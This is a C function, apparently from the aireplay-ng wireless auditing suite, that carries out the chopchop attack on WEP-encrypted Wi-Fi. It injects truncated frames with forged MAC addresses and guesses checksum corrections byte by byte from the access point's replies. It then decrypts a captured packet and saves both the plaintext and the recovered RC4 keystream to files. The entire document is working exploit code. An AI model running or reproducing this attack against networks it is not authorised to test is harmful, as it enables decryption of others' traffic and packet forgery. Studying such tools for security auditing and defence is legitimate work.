int do_attack_chopchop( void )
{
    float f, ticks[4];
    int i, j, n, z, caplen, srcz;
    int data_start, data_end, srcdiff, diff;
    int guess, is_deauth_mode;
    int nb_bad_pkt;
    int tried_header_rec=0;

    unsigned char b1 = 0xAA;
    unsigned char b2 = 0xAA;

    FILE *f_cap_out;
    long nb_pkt_read;
    unsigned long crc_mask;
    unsigned char *chopped;

    unsigned char packet[4096];

    time_t tt;
    struct tm *lt;
    struct timeval tv;
    struct timeval tv2;
    struct pcap_file_header pfh_out;
    struct pcap_pkthdr pkh;


    if(getnet(NULL, 1, 0) != 0)
        return 1;

    srand( time( NULL ) );

    if( capture_ask_packet( &caplen, 0 ) != 0 )
        return( 1 );

    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
        z+=2;
    srcz = z;

    if( (unsigned)caplen > sizeof(srcbuf) || (unsigned)caplen > sizeof(h80211) )
        return( 1 );

    if( opt.r_smac_set == 1 )
    {
        //handle picky APs (send one valid packet before all the invalid ones)
        memset(packet, 0, sizeof(packet));

        memcpy( packet, NULL_DATA, 24 );
        memcpy( packet +  4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6 );
        memcpy( packet + 10, opt.r_smac,  6 );
        memcpy( packet + 16, opt.f_bssid, 6 );

        packet[0] = 0x08; //make it a data packet
        packet[1] = 0x41; //set encryption and ToDS=1

        memcpy( packet+24, h80211+z, caplen-z);

        if( send_packet( packet, caplen-z+24 ) != 0 )
            return( 1 );
        //done sending a correct packet
    }

    /* Special handling for spanning-tree packets */
    if ( memcmp( h80211 +  4, SPANTREE, 6 ) == 0 ||
        memcmp( h80211 + 16, SPANTREE, 6 ) == 0 )
    {
        b1 = 0x42; b2 = 0x42;
    }

    printf( "\n" );

    /* chopchop operation mode: truncate and decrypt the packet */
    /* we assume the plaintext starts with  AA AA 03 00 00 00   */
    /* (42 42 03 00 00 00 for spanning-tree packets)            */

    memcpy( srcbuf, h80211, caplen );

    /* setup the chopping buffer */

    n = caplen - z + 24;

    if( ( chopped = (unsigned char *) malloc( n ) ) == NULL )
    {
        perror( "malloc failed" );
        return( 1 );
    }

    memset( chopped, 0, n );

    data_start = 24 + 4;
    data_end   = n;
    srcdiff = z-24;

    chopped[0] = 0x08;  /* normal data frame */
    chopped[1] = 0x41;  /* WEP = 1, ToDS = 1 */

    /* copy the duration */

    memcpy( chopped + 2, h80211 + 2, 2 );

    /* copy the BSSID */

    switch( h80211[1] & 3 )
    {
        case  0: memcpy( chopped + 4, h80211 + 16, 6 ); break;
        case  1: memcpy( chopped + 4, h80211 +  4, 6 ); break;
        case  2: memcpy( chopped + 4, h80211 + 10, 6 ); break;
        default: memcpy( chopped + 4, h80211 + 10, 6 ); break;
    }

    /* copy the WEP IV */

    memcpy( chopped + 24, h80211 + z, 4 );

    /* setup the xor mask to hide the original data */

    crc_mask = 0;

    for( i = data_start; i < data_end - 4; i++ )
    {
        switch( i - data_start )
        {
            case  0: chopped[i] = b1 ^ 0xE0; break;
            case  1: chopped[i] = b2 ^ 0xE0; break;
            case  2: chopped[i] = 0x03 ^ 0x03; break;
            default: chopped[i] = 0x55 ^ ( i & 0xFF ); break;
        }

        crc_mask = crc_tbl[crc_mask & 0xFF]
                 ^ ( crc_mask   >>  8 )
                 ^ ( chopped[i] << 24 );
    }

    for( i = 0; i < 4; i++ )
        crc_mask = crc_tbl[crc_mask & 0xFF]
                 ^ ( crc_mask >> 8 );

    chopped[data_end - 4] = crc_mask; crc_mask >>= 8;
    chopped[data_end - 3] = crc_mask; crc_mask >>= 8;
    chopped[data_end - 2] = crc_mask; crc_mask >>= 8;
    chopped[data_end - 1] = crc_mask; crc_mask >>= 8;

    for( i = data_start; i < data_end; i++ )
        chopped[i] ^= srcbuf[i+srcdiff];

    data_start += 6; /* skip the SNAP header */

    /* if the replay source mac is unspecified, forge one */

    if( opt.r_smac_set == 0 )
    {
        is_deauth_mode = 1;

        opt.r_smac[0] = 0x00;
        opt.r_smac[1] = rand() & 0x3E;
        opt.r_smac[2] = rand() & 0xFF;
        opt.r_smac[3] = rand() & 0xFF;
        opt.r_smac[4] = rand() & 0xFF;

        memcpy( opt.r_dmac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6 );
    }
    else
    {
        is_deauth_mode = 0;

        opt.r_dmac[0] = 0xFF;
        opt.r_dmac[1] = rand() & 0xFE;
        opt.r_dmac[2] = rand() & 0xFF;
        opt.r_dmac[3] = rand() & 0xFF;
        opt.r_dmac[4] = rand() & 0xFF;
    }

    /* let's go chopping */

    memset( ticks, 0, sizeof( ticks ) );

    nb_pkt_read = 0;
    nb_pkt_sent = 0;
    nb_bad_pkt  = 0;
    guess       = 256;

    tt = time( NULL );

    alarm( 30 );

    signal( SIGALRM, sighandler );

    if(opt.port_in <= 0)
    {
        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
        {
            perror( "fcntl(O_NONBLOCK) failed" );
            return( 1 );
        }
    }

    while( data_end > data_start )
    {
        if( alarmed )
        {
            printf( "\n\n"
"The chopchop attack appears to have failed. Possible reasons:\n"
"\n"
"    * You're trying to inject with an unsupported chipset (Centrino?).\n"
"    * The driver source wasn't properly patched for injection support.\n"
"    * You are too far from the AP. Get closer or reduce the send rate.\n"
"    * Target is 802.11g only but you are using a Prism2 or RTL8180.\n"
"    * The wireless interface isn't setup on the correct channel.\n" );
            if( is_deauth_mode )
                printf(
"    * The AP isn't vulnerable when operating in non-authenticated mode.\n"
"      Run aireplay-ng in authenticated mode instead (-h option).\n\n" );
            else
                printf(
"    * The client MAC you have specified is not currently authenticated.\n"
"      Try running another aireplay-ng to fake authentication (attack \"-1\").\n"
"    * The AP isn't vulnerable when operating in authenticated mode.\n"
"      Try aireplay-ng in non-authenticated mode instead (no -h option).\n\n" );
            return( 1 );
        }

        /* wait for the next timer interrupt, or sleep */

        if( dev.fd_rtc >= 0 )
        {
            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
            {
                perror( "\nread(/dev/rtc) failed" );
                return( 1 );
            }

            ticks[0]++;  /* ticks since we entered the while loop     */
            ticks[1]++;  /* ticks since the last status line update   */
            ticks[2]++;  /* ticks since the last frame was sent       */
            ticks[3]++;  /* ticks since started chopping current byte */
        }
        else
        {
            /* we can't trust usleep, since it depends on the HZ */

            gettimeofday( &tv,  NULL );
            usleep( 976 );
            gettimeofday( &tv2, NULL );

            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )
                        + (float) ( tv2.tv_usec - tv.tv_usec );

            ticks[0] += f / 976;
            ticks[1] += f / 976;
            ticks[2] += f / 976;
            ticks[3] += f / 976;
        }

        /* update the status line */

        if( ticks[1] > (RTC_RESOLUTION/10) )
        {
            ticks[1] = 0;
            printf( "\rSent %3ld packets, current guess: %02X...\33[K",
                    nb_pkt_sent, guess );
            fflush( stdout );
        }

        if( data_end < 41 && ticks[3] > 8 * ( ticks[0] - ticks[3] ) /
                                (int) ( caplen - ( data_end - 1 ) ) )
        {
            header_rec:

            printf( "\n\nThe AP appears to drop packets shorter "
                    "than %d bytes.\n",data_end );

            data_end = 40;

            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
                z+=2;

            diff = z-24;

            if( ( chopped[data_end + 0] ^ srcbuf[data_end + srcdiff + 0] ) == 0x06 &&
                ( chopped[data_end + 1] ^ srcbuf[data_end + srcdiff + 1] ) == 0x04 &&
                ( chopped[data_end + 2] ^ srcbuf[data_end + srcdiff + 2] ) == 0x00 )
            {
                printf( "Enabling standard workaround: "
                        "ARP header re-creation.\n" );

                chopped[24 + 10] = srcbuf[srcz + 10] ^ 0x08;
                chopped[24 + 11] = srcbuf[srcz + 11] ^ 0x06;
                chopped[24 + 12] = srcbuf[srcz + 12] ^ 0x00;
                chopped[24 + 13] = srcbuf[srcz + 13] ^ 0x01;
                chopped[24 + 14] = srcbuf[srcz + 14] ^ 0x08;
                chopped[24 + 15] = srcbuf[srcz + 15] ^ 0x00;
            }
            else
            {
                printf( "Enabling standard workaround: "
                        " IP header re-creation.\n" );

                n = caplen - ( z + 16 );

                chopped[24 +  4] = srcbuf[srcz +  4] ^ 0xAA;
                chopped[24 +  5] = srcbuf[srcz +  5] ^ 0xAA;
                chopped[24 +  6] = srcbuf[srcz +  6] ^ 0x03;
                chopped[24 +  7] = srcbuf[srcz +  7] ^ 0x00;
                chopped[24 +  8] = srcbuf[srcz +  8] ^ 0x00;
                chopped[24 +  9] = srcbuf[srcz +  9] ^ 0x00;
                chopped[24 + 10] = srcbuf[srcz + 10] ^ 0x08;
                chopped[24 + 11] = srcbuf[srcz + 11] ^ 0x00;
                chopped[24 + 14] = srcbuf[srcz + 14] ^ ( n >> 8 );
                chopped[24 + 15] = srcbuf[srcz + 15] ^ ( n & 0xFF );

                memcpy( h80211, srcbuf, caplen );

                for( i = z + 4; i < (int) caplen; i++ )
                    h80211[i - 4] = h80211[i] ^ chopped[i-diff];

                /* sometimes the header length or the tos field vary */

                for( i = 0; i < 16; i++ )
                {
                    h80211[z +  8] = 0x40 + i;
                    chopped[24 + 12] = srcbuf[srcz + 12] ^ ( 0x40 + i );

                    for( j = 0; j < 256; j++ )
                    {
                        h80211[z +  9] = j;
                        chopped[24 + 13] = srcbuf[srcz + 13] ^ j;

                        if( check_crc_buf( h80211 + z, caplen - z - 8 ) )
                            goto have_crc_match;
                    }
                }

                printf( "This doesn't look like an IP packet, "
                        "try another one.\n" );
            }

        have_crc_match:
            break;
        }

        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )
        {
            /* send one modified frame */

            ticks[2] = 0;

            memcpy( h80211, chopped, data_end - 1 );

            /* note: guess 256 is special, it tests if the  *
             * AP properly drops frames with an invalid ICV *
             * so this guess always has its bit 8 set to 0  */

            if( is_deauth_mode )
            {
                opt.r_smac[1] |= ( guess < 256 );
                opt.r_smac[5]  = guess & 0xFF;
            }
            else
            {
                opt.r_dmac[1] |= ( guess < 256 );
                opt.r_dmac[5]  = guess & 0xFF;
            }

            memcpy( h80211 + 10, opt.r_smac,  6 );
            memcpy( h80211 + 16, opt.r_dmac,  6 );

            if( guess < 256 )
            {
                h80211[data_end - 2] ^= crc_chop_tbl[guess][3];
                h80211[data_end - 3] ^= crc_chop_tbl[guess][2];
                h80211[data_end - 4] ^= crc_chop_tbl[guess][1];
                h80211[data_end - 5] ^= crc_chop_tbl[guess][0];
            }

            errno = 0;

            if( send_packet( h80211, data_end -1 ) != 0 )
                return( 1 );

            if( errno != EAGAIN )
            {
                guess++;

                if( guess > 256 )
                    guess = 0;
            }
        }

        /* watch for a response from the AP */

        n = read_packet( h80211, sizeof( h80211 ), NULL );

        if( n  < 0 ) return( 1 );
        if( n == 0 ) continue;

        nb_pkt_read++;

        /* check if it's a deauth packet */

        if( h80211[0] == 0xA0 || h80211[0] == 0xC0 )
        {
            if( memcmp( h80211 + 4, opt.r_smac, 6 ) == 0 &&
                ! is_deauth_mode )
            {
                nb_bad_pkt++;

                if( nb_bad_pkt > 256 )
                {
                    printf("\rgot several deauthentication packets - pausing 3 seconds for reconnection\n");
                    sleep(3);
                    nb_bad_pkt = 0;
                }

                continue;
            }

            if( h80211[4] != opt.r_smac[0] ) continue;
            if( h80211[6] != opt.r_smac[2] ) continue;
            if( h80211[7] != opt.r_smac[3] ) continue;
            if( h80211[8] != opt.r_smac[4] ) continue;

            if( ( h80211[5]     & 0xFE ) !=
                ( opt.r_smac[1] & 0xFE ) ) continue;

            if( ! ( h80211[5] & 1 ) )
            {
            	if( data_end < 41 ) goto header_rec;

                printf( "\n\nFailure: the access point does not properly "
                        "discard frames with an\ninvalid ICV - try running "
                        "aireplay-ng in authenticated mode (-h) instead.\n\n" );
                return( 1 );
            }
        }
        else
        {
            if( is_deauth_mode )
                continue;

            /* check if it's a WEP data packet */

            if( ( h80211[0] & 0x0C ) != 8 ) continue;
            if( ( h80211[0] & 0x70 ) != 0 ) continue;
            if( ( h80211[1] & 0x03 ) != 2 ) continue;
            if( ( h80211[1] & 0x40 ) == 0 ) continue;

            /* check the extended IV (TKIP) flag */

            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
                z+=2;

            if( ( h80211[z + 3] & 0x20 ) != 0 ) continue;

            /* check the destination address */

            if( h80211[4] != opt.r_dmac[0] ) continue;
            if( h80211[6] != opt.r_dmac[2] ) continue;
            if( h80211[7] != opt.r_dmac[3] ) continue;
            if( h80211[8] != opt.r_dmac[4] ) continue;

            if( ( h80211[5]     & 0xFE ) !=
                ( opt.r_dmac[1] & 0xFE ) ) continue;

            if( ! ( h80211[5] & 1 ) )
            {
            	if( data_end < 41 ) goto header_rec;

                printf( "\n\nFailure: the access point does not properly "
                        "discard frames with an\ninvalid ICV - try running "
                        "aireplay-ng in non-authenticated mode instead.\n\n" );
                return( 1 );
            }
        }

        /* we have a winner */

        guess = h80211[9];

        chopped[data_end - 1] ^= guess;
        chopped[data_end - 2] ^= crc_chop_tbl[guess][3];
        chopped[data_end - 3] ^= crc_chop_tbl[guess][2];
        chopped[data_end - 4] ^= crc_chop_tbl[guess][1];
        chopped[data_end - 5] ^= crc_chop_tbl[guess][0];

        n = caplen - data_start;

        printf( "\rOffset %4d (%2d%% done) | xor = %02X | pt = %02X | "
                "%4ld frames written in %5.0fms\n", data_end - 1,
                100 * ( caplen - data_end ) / n,
                chopped[data_end - 1],
                chopped[data_end - 1] ^ srcbuf[data_end + srcdiff - 1],
                nb_pkt_sent, ticks[3] );

        if( is_deauth_mode )
        {
            opt.r_smac[1] = rand() & 0x3E;
            opt.r_smac[2] = rand() & 0xFF;
            opt.r_smac[3] = rand() & 0xFF;
            opt.r_smac[4] = rand() & 0xFF;
        }
        else
        {
            opt.r_dmac[1] = rand() & 0xFE;
            opt.r_dmac[2] = rand() & 0xFF;
            opt.r_dmac[3] = rand() & 0xFF;
            opt.r_dmac[4] = rand() & 0xFF;
        }

        ticks[3]        = 0;
        nb_pkt_sent     = 0;
        nb_bad_pkt      = 0;
        guess           = 256;

        data_end--;

        alarm( 0 );
    }

    /* reveal the plaintext (chopped contains the prga) */

    memcpy( h80211, srcbuf, caplen );

    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
        z+=2;
    diff = z-24;

    chopped[24 + 4] = srcbuf[srcz + 4] ^ b1;
    chopped[24 + 5] = srcbuf[srcz + 5] ^ b2;
    chopped[24 + 6] = srcbuf[srcz + 6] ^ 0x03;
    chopped[24 + 7] = srcbuf[srcz + 7] ^ 0x00;
    chopped[24 + 8] = srcbuf[srcz + 8] ^ 0x00;
    chopped[24 + 9] = srcbuf[srcz + 9] ^ 0x00;

    for( i = z + 4; i < (int) caplen; i++ )
        h80211[i - 4] = h80211[i] ^ chopped[i-diff];

    if( ! check_crc_buf( h80211 + z, caplen - z - 8 ) ) {
        if (!tried_header_rec) {
            printf( "\nWarning: ICV checksum verification FAILED! Trying workaround.\n" );
            tried_header_rec=1;
            goto header_rec;
        } else {
            printf( "\nWorkaround couldn't fix ICV checksum.\nPacket is most likely invalid/useless\nTry another one.\n" );
        }
    }

    caplen -= 4 + 4; /* remove the WEP IV & CRC (ICV) */

    h80211[1] &= 0xBF;   /* remove the WEP bit, too */

    /* save the decrypted packet */

    gettimeofday( &tv, NULL );

    pfh_out.magic         = TCPDUMP_MAGIC;
    pfh_out.version_major = PCAP_VERSION_MAJOR;
    pfh_out.version_minor = PCAP_VERSION_MINOR;
    pfh_out.thiszone      = 0;
    pfh_out.sigfigs       = 0;
    pfh_out.snaplen       = 65535;
    pfh_out.linktype      = LINKTYPE_IEEE802_11;

    pkh.tv_sec  = tv.tv_sec;
    pkh.tv_usec = tv.tv_usec;
    pkh.caplen  = caplen;
    pkh.len     = caplen;

    lt = localtime( (const time_t *) &tv.tv_sec );

    memset( strbuf, 0, sizeof( strbuf ) );
    snprintf( strbuf,  sizeof( strbuf ) - 1,
              "replay_dec-%02d%02d-%02d%02d%02d.cap",
              lt->tm_mon + 1, lt->tm_mday,
              lt->tm_hour, lt->tm_min, lt->tm_sec );

    printf( "\nSaving plaintext in %s\n", strbuf );

    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
    {
        perror( "fopen failed" );
        return( 1 );
    }

    n = sizeof( struct pcap_file_header );

    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed\n" );
        return( 1 );
    }

    n = sizeof( pkh );

    if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed" );
        return( 1 );
    }

    n = pkh.caplen;

    if( fwrite( h80211, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed" );
        return( 1 );
    }

    fclose( f_cap_out );

    /* save the RC4 stream (xor mask) */

    memset( strbuf, 0, sizeof( strbuf ) );
    snprintf( strbuf,  sizeof( strbuf ) - 1,
              "replay_dec-%02d%02d-%02d%02d%02d.xor",
              lt->tm_mon + 1, lt->tm_mday,
              lt->tm_hour, lt->tm_min, lt->tm_sec );

    printf( "Saving keystream in %s\n", strbuf );

    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
    {
        perror( "fopen failed" );
        return( 1 );
    }

    n = pkh.caplen + 8 - 24;

    if( fwrite( chopped + 24, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed" );
        return( 1 );
    }

    fclose( f_cap_out );

    printf( "\nCompleted in %lds (%0.2f bytes/s)\n\n",
            (long) time( NULL ) - tt,
            (float) ( pkh.caplen - 6 - 24 ) /
            (float) ( time( NULL ) - tt  ) );

    return( 0 );
}